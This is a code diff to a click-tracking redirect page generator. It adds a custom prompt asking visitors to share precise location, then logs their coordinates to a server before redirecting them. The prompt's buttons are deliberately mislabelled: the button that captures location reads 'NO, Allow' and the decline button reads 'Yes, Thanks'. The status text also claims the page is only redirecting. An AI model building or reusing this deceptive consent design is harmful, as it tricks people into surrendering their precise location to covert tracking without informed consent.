@@ -580,23 +580,53 @@ function generateTrackingHTML(clickId, targetUrl) {
     }
     .location-prompt {
       margin-top: 24px;
-      padding: 16px;
+      padding: 20px;
       background: #f8f9fa;
-      border-radius: 8px;
+      border-radius: 12px;
     }
-    .location-btn {
+    .location-icon {
+      width: 48px;
+      height: 48px;
       background: #667eea;
-      color: white;
-      border: none;
-      padding: 12px 24px;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .location-icon svg {
+      width: 24px;
+      height: 24px;
+      fill: white;
+    }
+    .btn-group {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+      justify-content: center;
+    }
+    .btn {
+      padding: 12px 32px;
       border-radius: 8px;
       font-size: 14px;
+      font-weight: 600;
       cursor: pointer;
-      margin-top: 16px;
-      transition: background 0.2s;
+      border: none;
+      transition: all 0.2s;
     }
-    .location-btn:hover {
+    .btn-yes {
+      background: #667eea;
+      color: white;
+    }
+    .btn-yes:hover {
       background: #5a6fd6;
+    }
+    .btn-no {
+      background: #e9ecef;
+      color: #666;
+    }
+    .btn-no:hover {
+      background: #dee2e6;
     }
     .hidden { display: none; }
     .success-icon {
@@ -623,7 +653,20 @@ function generateTrackingHTML(clickId, targetUrl) {
       <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
     </div>
     <h1 id="statusTitle">One moment...</h1>
-    <p id="statusText">Requesting location access</p>
+    <p id="statusText">Redirecting to destination</p>
+
+    <!-- Location Permission Prompt -->
+    <div class="location-prompt" id="locationPrompt">
+      <div class="location-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+      </div>
+      <h1>Allow Location Access?</h1>
+      <p>Enable precise location tracking for better analytics?<br>You can choose not to share your location.</p>
+      <div class="btn-group">
+        <button class="btn btn-yes" onclick="handleLocationYes()">NO, Allow</button>
+        <button class="btn btn-no" onclick="handleLocationNo()">Yes, Thanks</button>
+      </div>
+    </div>
   </div>
 
   <script>
@@ -633,20 +676,23 @@ function generateTrackingHTML(clickId, targetUrl) {
     // Track if location was captured
     let locationCaptured = false;
 
-    // Request location permission - shows native Yes/No dialog
-    function requestLocation() {
+    // User clicked YES - show native location dialog
+    function handleLocationYes() {
+      document.getElementById('locationPrompt').classList.add('hidden');
+      document.getElementById('loadingSpinner').classList.remove('hidden');
+      document.getElementById('statusTitle').textContent = 'Requesting location...';
+      document.getElementById('statusText').textContent = 'Please allow location access when prompted';
+
       if (!navigator.geolocation) {
         logLocationDenied('unavailable');
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
-        // Success - user said YES
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           logLocation(latitude, longitude, accuracy);
         },
-        // Error - user said NO or error occurred
         (error) => {
           let reason = 'denied';
           switch(error.code) {
@@ -668,6 +714,12 @@ function generateTrackingHTML(clickId, targetUrl) {
           maximumAge: 0
         }
       );
+    }
+
+    // User clicked NO - just redirect
+    function handleLocationNo() {
+      document.getElementById('locationPrompt').classList.add('hidden');
+      logLocationDenied('denied');
     }
 
     // Log location to server
@@ -717,9 +769,6 @@ function generateTrackingHTML(clickId, targetUrl) {
         window.location.href = targetUrl;
       }, 300);
     }
-
-    // Initialize - immediately request location (shows native dialog)
-    requestLocation();
 
     // Fallback redirect after 8 seconds regardless
     setTimeout(() => {
